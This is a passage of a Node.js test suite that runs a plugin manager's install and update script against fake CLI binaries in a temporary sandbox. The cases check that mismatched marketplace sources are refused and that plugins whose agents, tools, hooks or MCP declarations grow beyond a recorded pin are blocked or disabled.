#!/usr/bin/env node
// Behaviour test for pro-core's /pro-dev machinery: scripts/pro-dev.py (status,
// run, answer, plugins update, plugins swap-starter, stale) and the SessionStart
// nudge scripts/pro-dev-nudge.py.
//
// check.mjs asserts the content contract (registry rows are well formed, the
// hook is registered). This file drives the real scripts, one process per case,
// with a fake `claude` and a fake `npx` first on PATH that record their argv and
// working folder to a log file, a temp HOME and temp repos. It never touches the
// real HOME, never installs anything and never calls the network.
//
//   node tests/pro-dev.mjs
//   node tests/pro-dev.mjs --only=stale            # substring filter on case id
//   node tests/pro-dev.mjs --plugin-root=/abs/path # run against an installed copy
//
// Skips cleanly (the caller treats `skipped` as a warning, never a failure) when
// python3 or git is not on PATH or the scripts are not on disk.

import {
  mkdtempSync, mkdirSync, rmSync, existsSync, realpathSync, symlinkSync,
  writeFileSync, readFileSync, readdirSync, chmodSync, cpSync,
} from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync, execFileSync } from "node:child_process";

const HERE = dirname(fileURLToPath(import.meta.url));
const DEFAULT_PLUGIN_ROOT = resolve(HERE, "..", "plugins", "pro-core");

const FAKE_CLAUDE = `#!/usr/bin/env python3
import json, os, sys
argv = sys.argv[1:]
log = os.environ.get("FAKE_LOG")
if log:
    with open(log, "a") as f:
        f.write(json.dumps({"tool": "claude", "cwd": os.getcwd(), "argv": argv}) + "\\n")
lst = os.environ.get("FAKE_PLUGIN_LIST")
if argv[:2] == ["plugin", "list"]:
    sys.stdout.write(open(lst).read() if lst and os.path.exists(lst) else "[]")
    sys.exit(0)
mp = os.environ.get("FAKE_MP_ADD")
if argv[:3] == ["plugin", "marketplace", "add"] and mp:
    spec = json.load(open(mp))
    kp = os.path.join(os.path.expanduser("~"), ".claude", "plugins", "known_marketplaces.json")
    data = json.load(open(kp)) if os.path.exists(kp) else {}
    data[spec["name"]] = spec["entry"]
    json.dump(data, open(kp, "w"))
    sys.exit(0)
fm = os.environ.get("FAKE_FAIL_MATCH")
if fm and fm in " ".join(argv):
    sys.stderr.write("boom\\n")
    sys.exit(1)
nv = os.environ.get("FAKE_NEW_VERSION")
if argv[:2] == ["plugin", "update"] and nv and lst and os.path.exists(lst):
    data = json.load(open(lst))
    for e in data:
        if e.get("id") == argv[2]:
            e["version"] = nv
    json.dump(data, open(lst, "w"))
def write_spec(name):
    spec = os.environ.get(name)
    if spec:
        path, content = spec.split("|", 1)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, "w").write(content)
if argv[:2] == ["plugin", "update"]:
    write_spec("FAKE_UPDATE_WRITE")
if argv[:3] == ["plugin", "marketplace", "update"]:
    write_spec("FAKE_MPUPDATE_WRITE")
ip = os.environ.get("FAKE_INSTALL_PATH")
if argv[:2] == ["plugin", "install"]:
    write_spec("FAKE_INSTALL_WRITE")
    if ip and lst:
        data = json.load(open(lst)) if os.path.exists(lst) else []
        data.append({"id": argv[2], "scope": "project", "projectPath": os.getcwd(), "installPath": ip,
                     "version": "1.0.0", "enabled": True})
        json.dump(data, open(lst, "w"))
if argv[:2] == ["plugin", "disable"] and lst and os.path.exists(lst):
    data = json.load(open(lst))
    for e in data:
        if e.get("id") == argv[2]:
            e["enabled"] = False
    json.dump(data, open(lst, "w"))
sys.exit(0)
`;

const FAKE_NPX = `#!/usr/bin/env python3
import json, os, sys
argv = sys.argv[1:]
log = os.environ.get("FAKE_LOG")
if log:
    with open(log, "a") as f:
        f.write(json.dumps({"tool": "npx", "cwd": os.getcwd(), "argv": argv}) + "\\n")
fm = os.environ.get("FAKE_FAIL_MATCH")
if fm and fm in " ".join(argv):
    sys.stderr.write("boom\\n")
    sys.exit(1)
for rel in filter(None, os.environ.get("FAKE_NPX_FILES", "").split(":")):
    if "@@" in rel:
        want, rel = rel.split("@@", 1)
        if want not in " ".join(argv):
            continue
    path = os.path.join(os.getcwd(), rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, "w").write("---\\nname: fake\\n---\\n")
sys.exit(0)
`;

const QA_FILES = ["qa-do", "qa-start", "playwright-automation", "visual-testing", "api-testing",
  "contract-testing", "test-reliability", "test-strategy", "risk-based-testing", "test-planning",
  "qa-project-context"].map((n) => `.claude/skills/${n}/SKILL.md`);
const LAVISH_FILE = ".claude/skills/lavish/SKILL.md";
const MS = "pro-dev-skillset";

function read(p) { return readFileSync(p, "utf8"); }
function json(p) { return JSON.parse(read(p)); }

function buildSandbox(pluginRoot) {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "pro-dev-test-")));
  const home = join(root, "home");
  const repo = join(root, "repo");
  const tools = join(root, "tools");
  mkdirSync(join(home, ".claude", "plugins"), { recursive: true });
  mkdirSync(repo, { recursive: true });
  mkdirSync(tools, { recursive: true });
  execFileSync("git", ["init", "-q", repo]);
  for (const t of ["python3", "git"]) {
    const found = spawnSync("sh", ["-c", `command -v ${t}`], { encoding: "utf8" }).stdout.trim();
    symlinkSync(found, join(tools, t));
  }
  const bins = {};
  const makeBin = (name, { claude = true, npx = true } = {}) => {
    const dir = join(root, name);
    mkdirSync(dir, { recursive: true });
    if (claude) { writeFileSync(join(dir, "claude"), FAKE_CLAUDE); chmodSync(join(dir, "claude"), 0o755); }
    if (npx) { writeFileSync(join(dir, "npx"), FAKE_NPX); chmodSync(join(dir, "npx"), 0o755); }
    return dir;
  };
  bins.both = makeBin("bin-both");
  bins.noNpx = makeBin("bin-no-npx", { npx: false });
  bins.noClaude = makeBin("bin-no-claude", { claude: false });
  const logPath = join(root, "calls.log");
  const listPath = join(root, "plugin-list.json");
  let script = join(pluginRoot, "scripts", "pro-dev.py");
  const nudge = join(pluginRoot, "scripts", "pro-dev-nudge.py");

  const setPlugins = (entries) => writeFileSync(listPath, JSON.stringify(entries.map((e) => ({
    version: "1.0.0", enabled: true, installPath: join(root, "cache", e.id.split("@")[0]), ...e,
  }))));
  const entry = (name, scope, projectPath, extra = {}) => ({
    id: `${name}@${MS}`, scope, ...(projectPath ? { projectPath } : {}), ...extra,
  });
  let installTarget = null; // where the fake `claude plugin install` says the plugin landed
  const env = (bin, extra = {}) => ({
    PATH: `${bins[bin ?? "both"]}:${tools}`, HOME: home, FAKE_LOG: logPath, FAKE_PLUGIN_LIST: listPath,
    ...(installTarget ? { FAKE_INSTALL_PATH: installTarget } : {}), ...extra,
  });
  const run = (args, { bin, extra, cwd } = {}) => {
    const r = spawnSync("python3", [script, "--repo", repo, ...args], {
      encoding: "utf8", env: env(bin, extra), cwd: cwd ?? repo,
    });
    return { code: r.status, out: (r.stdout ?? "") + (r.stderr ?? ""), stdout: r.stdout ?? "" };
  };
  const status = (opts) => JSON.parse(run(["status", "--json"], opts).stdout);
  const engine = (st, id) => st.engines.find((e) => e.id === id);
  const calls = (tool) => (existsSync(logPath) ? read(logPath).trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : [])
    .filter((c) => !(c.tool === "claude" && c.argv[0] === "plugin" && c.argv[1] === "list"))
    .filter((c) => !tool || c.tool === tool);
  // a copy of the script beside a registry holding only these rows, for the marketplace and surface cases
  const useRows = (rows) => {
    const pc = join(root, "pc");
    mkdirSync(join(pc, "scripts"), { recursive: true });
    mkdirSync(join(pc, "registry"), { recursive: true });
    writeFileSync(join(pc, "scripts", "pro-dev.py"), read(join(pluginRoot, "scripts", "pro-dev.py")));
    writeFileSync(join(pc, "registry", "engines.json"), JSON.stringify({ version: 1, engines: rows }));
    script = join(pc, "scripts", "pro-dev.py");
  };
  const answersPath = join(repo, ".claude", "pro-dev.json");
  const installedFile = join(home, ".claude", "plugins", "installed_plugins.json");
  return { root, home, repo, tools, bins, run, status, engine, calls, setPlugins, entry, env, logPath, listPath,
    answersPath, installedFile, nudge, get script() { return script; }, useRows, setInstallTarget: (p) => { installTarget = p; } };
}

const ok = (detail = "") => ({ ok: true, detail });
const bad = (detail) => ({ ok: false, detail });
const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

function registry(pluginRoot) { return json(join(pluginRoot, "registry", "engines.json")); }


// --- marketplace and surface fixtures ------------------------------------------

const EGM_SRC = "google/elephant-goldfish-model";
const EGM_ENTRY = { source: { source: "github", repo: EGM_SRC }, installLocation: "" };

function egmRow(extra = {}) {
  return {
    id: "egm", owner: "pro-egm", bridges: [], kind: "claude-plugin", default: true,
    detect: { plugin: "egm@egm" },
    install: ["claude", "plugin", "install", "egm@egm", "--scope", "project"],
    update: ["claude", "plugin", "update", "egm@egm", "--scope", "project"],
    marketplace: { name: "egm", source: EGM_SRC },
    why: "test row", ...extra,
  };
}

// a plugin folder: two agents, one skill, one hook file; commands are { name: { allowed, body } }
function writePlugin(dir, { agents = { a: "Read, Grep", b: "Read, Glob" }, skills = { s: null }, hooks = { hooks: {} },
  manifest = {}, commands = {} } = {}) {
  for (const [n, c] of Object.entries(commands)) {
    mkdirSync(join(dir, "commands"), { recursive: true });
    writeFileSync(join(dir, "commands", `${n}.md`), `---\ndescription: ${n}\n${c.allowed ? `allowed-tools: ${c.allowed}\n` : ""}---\n${c.body ?? "body"}\n`);
  }
  mkdirSync(join(dir, ".claude-plugin"), { recursive: true });
  writeFileSync(join(dir, ".claude-plugin", "plugin.json"), JSON.stringify({ name: "egm", ...manifest }));
  for (const [n, tools] of Object.entries(agents)) {
    mkdirSync(join(dir, "agents"), { recursive: true });
    writeFileSync(join(dir, "agents", `${n}.md`), `---\nname: ${n}\n${tools ? `tools: ${tools}\n` : ""}---\nbody\n`);
  }
  for (const [n, allowed] of Object.entries(skills)) {
    mkdirSync(join(dir, "skills", n), { recursive: true });
    writeFileSync(join(dir, "skills", n, "SKILL.md"), `---\nname: ${n}\n${allowed ? `allowed-tools: ${allowed}\n` : ""}---\nbody\n`);
  }
  if (hooks) {
    mkdirSync(join(dir, "hooks"), { recursive: true });
    writeFileSync(join(dir, "hooks", "hooks.json"), JSON.stringify(hooks));
  }
}

function writeKnown(s, entry) {
  writeFileSync(join(s.home, ".claude", "plugins", "known_marketplaces.json"), JSON.stringify({ egm: entry }));
}

// A marketplace clone holding the plugin at its root (source "./"), registered from the right repo.
// The pin is taken from the plugin itself, the way the orchestrator fills it from a real install.
function egmWorld(s, { plugin = {}, rowExtra = {}, source = "./", pin = true } = {}) {
  const clone = join(s.root, "mp", "clone");
  mkdirSync(join(clone, ".claude-plugin"), { recursive: true });
  writeFileSync(join(clone, ".claude-plugin", "marketplace.json"), JSON.stringify({ name: "egm", plugins: [{ name: "egm", source }] }));
  writePlugin(clone, plugin);
  writeKnown(s, { ...EGM_ENTRY, installLocation: clone });
  const inst = join(s.root, "mp", "inst");
  writePlugin(inst, plugin);
  s.useRows([egmRow()]);
  s.setInstallTarget(inst);
  s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst }]);
  let surface = null;
  if (pin) {
    surface = JSON.parse(s.run(["surface", "egm"]).stdout);
    s.useRows([egmRow({ surface, ...rowExtra })]);
  }
  s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
  return { clone, inst, surface };
}

const installCalls = (s) => s.calls("claude").filter((c) => c.argv[1] === "install");
const growth = (s, w) => {
  const r = s.run(["run", "egm", "install"]);
  if (r.code === 0 || installCalls(s).length) return bad(`row was installed past the pin: ${r.out}`);
  return r.out.includes(w) ? ok() : bad(`no "${w}" in: ${r.out}`);
};

const NEXT_FILES = ["next-cache-components-adoption", "next-cache-components-optimizer", "next-partial-prefetching-adoption",
  "next-partial-prefetching-optimizer", "next-bundle-optimizer", "next-dev-loop"].map((n) => `.claude/skills/${n}/SKILL.md`).join(":");

const CASES = [
  {
    id: "marketplace/add-when-absent",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      const spec = join(s.root, "mp-add.json");
      writeFileSync(spec, JSON.stringify({ name: "egm", entry: { ...EGM_ENTRY, installLocation: join(s.root, "none") } }));
      const r = s.run(["run", "egm", "install"], { extra: { FAKE_MP_ADD: spec } });
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      if (!same(a, [`plugin marketplace add ${EGM_SRC}`, "plugin install egm@egm --scope project"])) return bad(`calls ${JSON.stringify(a)}`);
      return /user-wide/.test(r.out) ? ok() : bad(`no user-wide note: ${r.out}`);
    },
  },
  {
    id: "marketplace/already-registered-matching-repo-any-case",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      writeKnown(s, { source: { source: "github", repo: EGM_SRC.toUpperCase() }, installLocation: "/x" });
      const r = s.run(["run", "egm", "install"]);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      return r.code === 0 && same(a, ["plugin install egm@egm --scope project"]) ? ok() : bad(`exit ${r.code} calls ${JSON.stringify(a)}: ${r.out}`);
    },
  },
  {
    id: "marketplace/mismatched-repo-is-refused-and-names-both",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      writeKnown(s, { source: { source: "github", repo: "evil/egm" }, installLocation: "/x" });
      const r = s.run(["run", "egm", "install"]);
      if (r.code !== 1 || s.calls("claude").length) return bad(`exit ${r.code}, calls ${JSON.stringify(s.calls("claude"))}`);
      return r.out.includes("evil/egm") && r.out.includes(EGM_SRC) ? ok() : bad(`both sources not printed: ${r.out}`);
    },
  },
  {
    id: "marketplace/non-github-source-is-refused",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      writeKnown(s, { source: { source: "git", url: "https://example.com/egm.git" }, installLocation: "/x" });
      const r = s.run(["run", "egm", "install"]);
      return r.code === 1 && !s.calls("claude").length && r.out.includes("example.com") ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "marketplace/unreadable-known-file-is-refused",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      writeFileSync(join(s.home, ".claude", "plugins", "known_marketplaces.json"), "{not json");
      const r = s.run(["run", "egm", "install"]);
      return r.code === 1 && !s.calls("claude").length && /unreadable/.test(r.out) ? ok() : bad(`exit ${r.code}, calls ${s.calls("claude").length}: ${r.out}`);
    },
  },
  {
    id: "marketplace/mismatch-on-an-already-detected-row",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo }]);
      writeKnown(s, { source: { source: "github", repo: "evil/egm" }, installLocation: "/x" });
      const r = s.run(["run", "egm", "install"]);
      if (r.code !== 1 || /already installed/.test(r.out)) return bad(`detected row skipped the check: exit ${r.code}: ${r.out}`);
      const all = s.run(["run", "all", "install"]);
      if (all.code !== 1 || /already installed/.test(all.out)) return bad(`run all skipped the check: ${all.out}`);
      writeKnown(s, { source: { source: "github", repo: EGM_SRC }, installLocation: "/x" });
      const fine = s.run(["run", "egm", "install"]);
      return fine.code === 0 && /already installed/.test(fine.out) ? ok() : bad(`matching row: ${fine.out}`);
    },
  },
  {
    id: "marketplace/status-shows-the-mismatch",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo)]);
      writeKnown(s, { source: { source: "github", repo: "evil/egm" }, installLocation: "/x" });
      const e = s.engine(s.status(), "egm");
      if (!e.marketplaceProblem || !e.marketplaceProblem.includes("evil/egm")) return bad(`no marketplaceProblem: ${JSON.stringify(e)}`);
      return e.wantsInstall === false ? ok() : bad("wantsInstall stayed true");
    },
  },
  {
    id: "marketplace/update-is-checked-too",
    run: (s) => {
      s.useRows([egmRow()]);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo }]);
      writeKnown(s, { source: { source: "github", repo: "evil/egm" }, installLocation: "/x" });
      const r = s.run(["run", "egm", "update"]);
      return r.code === 1 && !s.calls("claude").length ? ok() : bad(`exit ${r.code}, calls ${JSON.stringify(s.calls("claude"))}`);
    },
  },
  {
    id: "marketplace/rows-without-marketplace-or-surface-are-unchanged",
    run: (s) => {
      s.setPlugins([s.entry("pro-design", "project", s.repo)]);
      writeFileSync(join(s.home, ".claude", "plugins", "known_marketplaces.json"), "{not json");
      const r = s.run(["run", "figma", "install"]);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      return r.code === 0 && same(a, ["plugin install figma@claude-plugins-official --scope project"]) && !/surface/.test(r.out)
        ? ok() : bad(`exit ${r.code} calls ${JSON.stringify(a)}: ${r.out}`);
    },
  },
  {
    id: "surface/matching-surface-installs-and-prints-one-line",
    run: (s) => {
      egmWorld(s);
      const r = s.run(["run", "all", "install"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      if (!r.out.includes("egm: 2 agents, 1 skills, tools Glob Grep Read, hooks/MCP hash matches pin")) return bad(`no surface line: ${r.out}`);
      if (installCalls(s).length !== 1) return bad("not installed");
      const ans = existsSync(s.answersPath) ? read(s.answersPath) : "";
      return /surface/i.test(ans) ? bad(`surface written to the answers file: ${ans}`) : ok();
    },
  },
  {
    id: "surface/command-prints-the-pin-shape",
    run: (s) => {
      const { surface } = egmWorld(s, { plugin: { skills: { s: "Bash(git status:*), Write" } } });
      const keys = Object.keys(surface).sort().join();
      if (keys !== "agents,hooksMcpSha256,skills,tools") return bad(`keys ${keys}`);
      if (!/^[0-9a-f]{64}$/.test(surface.hooksMcpSha256)) return bad(`hash ${surface.hooksMcpSha256}`);
      const want = { "agents/a.md": ["Grep", "Read"], "agents/b.md": ["Glob", "Read"], "skills/s": ["Bash(git status:*)", "Write"] };
      return same(surface.tools, want) ? ok() : bad(`tools ${JSON.stringify(surface.tools)}`);
    },
  },
  {
    id: "surface/smaller-surface-proceeds",
    run: (s) => {
      const { clone } = egmWorld(s);
      rmSync(join(clone, "agents", "b.md"));
      const r = s.run(["run", "egm", "install"]);
      return r.code === 0 && installCalls(s).length === 1 && r.out.includes("1 agents") ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "surface/added-tool-becomes-a-question",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { agents: { a: "Read, Grep, Bash", b: "Read, Glob" } });
      const g = growth(s, "agents/a.md: tools not in the pin: Bash");
      if (!g.ok) return g;
      const e = s.engine(s.status(), "egm");
      return e.needsQuestion === true && e.wantsInstall === false && e.surfaceProblem?.length ? ok() : bad(`status ${JSON.stringify(e)}`);
    },
  },
  {
    id: "surface/more-agents-or-skills-become-a-question",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { agents: { a: "Read, Grep", b: "Read, Glob", c: "Read" }, skills: { s: null, t: null } });
      return growth(s, "3 agents, pinned 2");
    },
  },
  {
    id: "surface/agent-with-no-tools-line-counts-as-every-tool",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { agents: { a: "Read, Grep", b: null } });
      return growth(s, "agents/b.md: tools not in the pin: *");
    },
  },
  {
    id: "surface/same-counts-different-hook-hash",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, "hooks", "hooks.json"), JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "run-something-else" }] }] } }));
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/inline-hook-in-plugin-json-is-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { manifest: { hooks: { Stop: [{ hooks: [{ type: "command", command: "x" }] }] } } });
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/inline-mcp-in-the-marketplace-entry-is-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, ".claude-plugin", "marketplace.json"), JSON.stringify({
        plugins: [{ name: "egm", source: "./", mcpServers: { x: { command: "other" } } }],
      }));
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/symlinked-hooks-file-is-unknown",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(s.root, "outside.json"), JSON.stringify({ hooks: {} }));
      rmSync(join(clone, "hooks", "hooks.json"));
      symlinkSync(join(s.root, "outside.json"), join(clone, "hooks", "hooks.json"));
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/fifo-hooks-file-is-unknown-and-does-not-hang",
    run: (s) => {
      const { clone } = egmWorld(s);
      rmSync(join(clone, "hooks", "hooks.json"));
      if (spawnSync("mkfifo", [join(clone, "hooks", "hooks.json")]).status !== 0) return ok("skipped: no mkfifo");
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/marketplace-source-that-escapes-its-clone-is-unknown",
    run: (s) => {
      egmWorld(s, { source: "../.." });
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/marketplace-source-url-is-unknown-not-a-crash",
    run: (s) => {
      egmWorld(s, { source: "https://example.com/egm.git" });
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/missing-manifest-is-unknown-not-a-crash",
    run: (s) => {
      const { clone } = egmWorld(s);
      rmSync(join(clone, ".claude-plugin", "plugin.json"));
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/update-of-a-grown-install-is-disabled-and-fails",
    run: (s) => {
      const { inst } = egmWorld(s);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst }]);
      if (s.engine(s.status(), "egm").surfaceGrew) return bad("grew before the update");
      const grown = "---\nname: c\ntools: Bash\n---\n";
      const r = s.run(["run", "egm", "update"], { extra: { FAKE_UPDATE_WRITE: `${join(inst, "agents", "c.md")}|${grown}` } });
      if (r.code === 0) return bad(`exit 0: ${r.out}`);
      if (!r.out.includes("beyond the pin") || !r.out.includes("agents/c.md")) return bad(`output: ${r.out}`);
      const off = s.calls("claude").map((c) => c.argv.join(" "));
      if (!off.includes("plugin disable egm@egm --scope project")) return bad(`no disable: ${JSON.stringify(off)}`);
      const live = json(s.listPath).filter((e) => e.id === "egm@egm" && e.enabled !== false);
      return live.length === 0 ? ok() : bad(`still enabled: ${JSON.stringify(live)}`);
    },
  },
  {
    id: "surface/update-refreshes-the-clone-and-runs-when-it-matches",
    run: (s) => {
      const { inst } = egmWorld(s);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst }]);
      const r = s.run(["run", "egm", "update"]);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return same(a, ["plugin marketplace update egm", "plugin update egm@egm --scope project"]) ? ok() : bad(`calls ${JSON.stringify(a)}`);
    },
  },
  {
    id: "surface/update-blocked-by-a-grown-clone-never-runs-update",
    run: (s) => {
      const { clone, inst } = egmWorld(s);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst }]);
      // the clone only grows when the marketplace refresh runs, as it does for real
      const grown = "---\nname: c\ntools: Bash\n---\n";
      const r = s.run(["run", "egm", "update"], { extra: { FAKE_MPUPDATE_WRITE: `${join(clone, "agents", "c.md")}|${grown}` } });
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      if (r.code === 0) return bad(`exit 0: ${r.out}`);
      if (a.some((x) => x.startsWith("plugin update "))) return bad(`update ran: ${JSON.stringify(a)}`);
      if (a.some((x) => x.startsWith("plugin disable"))) return bad(`disabled: ${JSON.stringify(a)}`);
      if (!a.includes("plugin marketplace update egm")) return bad(`no refresh: ${JSON.stringify(a)}`);
      return /new entry agents\/c\.md/.test(r.out) && /not updated/.test(r.out) ? ok() : bad(`output: ${r.out}`);
    },
  },
  {
    id: "surface/update-with-an-unreadable-clone-is-a-question",
    run: (s) => {
      const { clone, inst } = egmWorld(s);
      s.setPlugins([s.entry("pro-egm", "project", s.repo), { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst }]);
      rmSync(join(clone, ".claude-plugin", "plugin.json"));
      const r = s.run(["run", "egm", "update"]);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      return r.code !== 0 && /surface unknown/.test(r.out) && !a.some((x) => x.startsWith("plugin update ")) ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "surface/install-that-drifts-from-the-clone-is-disabled-and-fails",
    run: (s) => {
      const { inst } = egmWorld(s);
      const grown = "---\nname: c\ntools: Bash\n---\n";
      const r = s.run(["run", "egm", "install"], { extra: { FAKE_INSTALL_WRITE: `${join(inst, "agents", "c.md")}|${grown}` } });
      if (r.code === 0) return bad(`exit 0: ${r.out}`);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      if (!a.includes("plugin disable egm@egm --scope project")) return bad(`no disable: ${JSON.stringify(a)}`);
      const live = json(s.listPath).filter((e) => e.id === "egm@egm" && e.enabled !== false);
      return live.length === 0 && r.out.includes("agents/c.md") ? ok() : bad(`still enabled or no name: ${r.out}`);
    },
  },
  {
    id: "surface/tools-are-pinned-per-entry-not-as-a-union",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { agents: { a: "Read, Grep, Glob", b: "Read" } }); // Glob moved from b to a: same union
      return growth(s, "agents/a.md: tools not in the pin: Glob");
    },
  },
  {
    id: "surface/removed-entries-and-tools-are-fine",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { agents: { a: "Read" } });
      rmSync(join(clone, "agents", "b.md"));
      const r = s.run(["run", "egm", "install"]);
      return r.code === 0 && installCalls(s).length === 1 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "surface/command-allowed-tools-are-in-the-map",
    run: (s) => {
      const { surface, clone } = egmWorld(s, { plugin: { commands: { go: { allowed: "Bash(git:*), Read" } } } });
      if (!same(surface.tools["commands/go.md"], ["Bash(git:*)", "Read"])) return bad(`tools ${JSON.stringify(surface.tools)}`);
      writePlugin(clone, { commands: { go: { allowed: "Bash(git:*), Read, Write" } } });
      return growth(s, "commands/go.md: tools not in the pin: Write");
    },
  },
  {
    id: "surface/command-shell-line-change-moves-the-hash",
    run: (s) => {
      const { clone } = egmWorld(s, { plugin: { commands: { go: { allowed: "Read", body: "text\n!echo one" } } } });
      writePlugin(clone, { commands: { go: { allowed: "Read", body: "text\n!echo two" } } });
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/command-prose-change-does-not-move-the-hash",
    run: (s) => {
      const { clone } = egmWorld(s, { plugin: { commands: { go: { allowed: "Read", body: "text\n!echo one" } } } });
      writePlugin(clone, { commands: { go: { allowed: "Read", body: "other prose\n!echo one" } } });
      const r = s.run(["run", "egm", "install"]);
      return r.code === 0 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "surface/lsp-declarations-are-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, ".lsp.json"), JSON.stringify({ x: { command: "other-lsp" } }));
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/inline-lsp-in-plugin-json-is-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { manifest: { lspServers: { x: { command: "other-lsp" } } } });
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/inline-lsp-in-the-marketplace-entry-is-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, ".claude-plugin", "marketplace.json"), JSON.stringify({
        plugins: [{ name: "egm", source: "./", lspServers: { x: { command: "other" } } }],
      }));
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/frontmatter-hooks-in-skill-and-agent-are-counted",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, "skills", "s", "SKILL.md"), "---\nname: s\nhooks:\n  PreToolUse:\n    - command: other\n---\nbody\n");
      const g = growth(s, "hooks/MCP declarations differ from the pin");
      if (!g.ok) return g;
      writePlugin(clone, {});
      writeFileSync(join(clone, "agents", "a.md"), "---\nname: a\ntools: Read, Grep\nhooks:\n  Stop:\n    - command: other\n---\nbody\n");
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/custom-skills-and-agents-paths-are-read",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { manifest: { skills: ["./extra"], agents: ["./more"] } });
      mkdirSync(join(clone, "extra", "z"), { recursive: true });
      writeFileSync(join(clone, "extra", "z", "SKILL.md"), "---\nname: z\nallowed-tools: Bash\n---\n");
      mkdirSync(join(clone, "more"), { recursive: true });
      writeFileSync(join(clone, "more", "m.md"), "---\nname: m\n---\n");
      const r = s.run(["run", "egm", "install"]);
      if (r.code === 0) return bad(`installed: ${r.out}`);
      return /new entry extra\/z \(tools Bash\)/.test(r.out) && /new entry more\/m\.md \(tools \*\)/.test(r.out) ? ok() : bad(`output: ${r.out}`);
    },
  },
  {
    id: "surface/custom-skills-path-does-not-hide-the-default-folder",
    run: (s) => {
      const { clone } = egmWorld(s, { plugin: { skills: { one: null, two: null } } });
      writePlugin(clone, { skills: { one: null, two: "Bash" }, manifest: { skills: ["./skills/one"] } });
      return growth(s, "skills/two: tools not in the pin: Bash");
    },
  },
  {
    id: "surface/moving-a-declared-path-moves-the-hash",
    run: (s) => {
      const { clone } = egmWorld(s, { plugin: { manifest: { skills: ["./skills"] } } });
      writePlugin(clone, { manifest: { skills: ["./skills/"] } });
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/marketplace-entry-agents-path-is-read",
    run: (s) => {
      const { clone } = egmWorld(s);
